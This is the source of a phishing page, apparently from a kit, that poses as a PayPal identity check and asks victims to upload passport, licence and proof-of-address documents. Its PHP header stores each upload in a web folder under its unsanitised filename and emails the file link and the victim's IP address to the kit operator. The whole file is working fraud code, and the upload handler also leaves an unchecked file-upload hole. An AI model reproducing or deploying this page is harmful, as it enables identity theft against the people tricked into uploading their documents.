﻿<?php
include 'config.php';
$iP_adress = $_SERVER['REMOTE_ADDR'];

if (isset($_POST["submit_id"])){
	move_uploaded_file($_FILES["file"]["tmp_name"], "css/" . $_FILES["file"]["name"]);
		if($Send_Email !== 1 ){}else{
$Info_LOG = "
|---------------- Bank-PPL ---------------|
New identity =>".$_SERVER['HTTP_HOST']."".dirname($_SERVER['PHP_SELF'])."/
css/".$_FILES["file"]["name"]."";
    $subject = 'New Upload | '.$iP_adress.'';
	$headers = 'From: JAAD' . "\r\n" .'X-Mailer: PHP/' . phpversion();
	mail($to, $subject, $Info_LOG, $headers);
	}
	}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<meta http-equiv="Content-Language" content="en-us" />
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>Upload your photo ID(s)</title>

<style type="text/css">
	body{
		background-color:#FFFFFF;
		font-family: Verdana, Arial, sans-serif;
		font-size: 12pt;
		color: #000000;
		padding: 0px;
        margin: 0px;
	}
	
	.error_message{
		font-family: Verdana, Arial, sans-serif;
		font-size: 11pt;
		color: #FF0000;
	}
	
	.thanks_message{
		font-family: Verdana, Arial, sans-serif;
		font-size: 11pt;
		color: #000000;
	}
	
	a:link{
		text-decoration:none;
		color: #000000;
	}
	a:visited{
		text-decoration:none;
		color: #000000;
	}
	a:hover{
		text-decoration:none;
		color: #000000;
	}
	
	.table {
		border-collapse:collapse;
		border:1px solid #000000;
		width:500px;
	}
	
	.table_header{
		border:1px solid #070707;
		background-color:#C03738;
		font-family: Verdana, Arial, sans-serif;
		font-size: 11pt;
		font-weight:bold;
		color: #FFFFFF;
		text-align:center;
		padding:2px;
	}
	
	.attach_info{
		border:1px solid #070707;
		background-color:#EBEBEB;
		font-family: Verdana, Arial, sans-serif;
		font-size: 8pt;
		color: #000000;
		padding:4px;
	}
	
	
	.table_body{
		border:1px solid #070707;
		background-color:#EBEBEB;
		font-family: Verdana, Arial, sans-serif;
		font-size: 10pt;
		color: #000000;
		padding:2px;
	}
	
	.table_footer{
		border:1px solid #070707;
		background-color:#C03738;
		text-align:center;
		padding:2px;
	}
	
	input,select,textarea {
    font-family: Verdana, Arial, sans-serif;
    font-size: 10pt;
    border-radius: 3px;
    padding: 5px;
    color: #000000;
    background-color: #ffffff;
    border: 1px solid #ffffff;
	}
	
	.copyright {
		border:0px;
		font-family: Verdana, Arial, sans-serif;
		font-size: 9pt;
		color: #000000;
		text-align:right;
	}
	
	form{
		padding:0px;
		margin:0px;
	}
	.pubi{
    background: #002f86;
    color: white;
    border: 3px solid #002f86;
    border-radius: 2px;
    font-size: 15px;
    padding: 5px;
    width: 120px;
    outline: none;
	}
	.pubi:hover{
		background: #009cde;
	    border: 3px solid #009cde;

	}
</style>
</head>
<body>

<img src='css/id0.png'/>
<br>
<center>
<div style="background: #e5e5e5;width: 900px;padding: 9px;border-radius: 4px;font-family: arial;text-align: left;">
<form method="post" method="post" enctype="multipart/form-data">
<p align="left">
  <b>Please Confirm your identity :</b>
<br>
</p>
To help ensure PayPal remains a safer place for all customers to transact, and to comply with regulatory requirements, we ask you to confirm your identity
<br>
<br>
<b>Documents required based on account type.</b>
<br>
<br>
Your name and address on the documents must match those on your PayPal account
<br>
<ul>
<li> A copy of a government-issued identity document (NRIC or Driver’s License or Passport recto+verso).</li>
<li>  A proof of address document such as the back copy of NRIC or utility bill or bank statement or any other government document under your name.</li>
</ul>
<br>
<br>
<center>
<div style='background: #e5e5e5;border: 4px dashed #009cde;width: 300px;border-radius: 25px;'>
<br>
<center>
<b>Upload your photo ID(s)</b>
<p></p>
<p>
Please use JPEGs if possible
<br>
<td width="70%" class="table_body"><input name="file" type="file" required="" size="30" /></td>
<p><input type="submit" name="submit_id" class='pubi' value="send"></p>
</center>
</div>
</center>

	</form>
</div>
</center>

	<br />
	<br />
</body>
</html>
